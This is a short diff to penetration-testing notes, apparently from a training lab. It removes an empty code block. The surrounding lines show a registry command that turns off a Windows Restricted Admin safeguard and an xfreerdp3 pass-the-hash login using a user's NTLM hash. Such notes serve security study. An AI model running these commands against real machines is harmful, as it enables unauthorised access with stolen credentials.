@@ -7,10 +7,6 @@ Enable Restricted Admin Mode to Allow PtH
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-```bash
-
-```
-
 PtH with xfreerdp3
 ```bash
 xfreerdp3  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
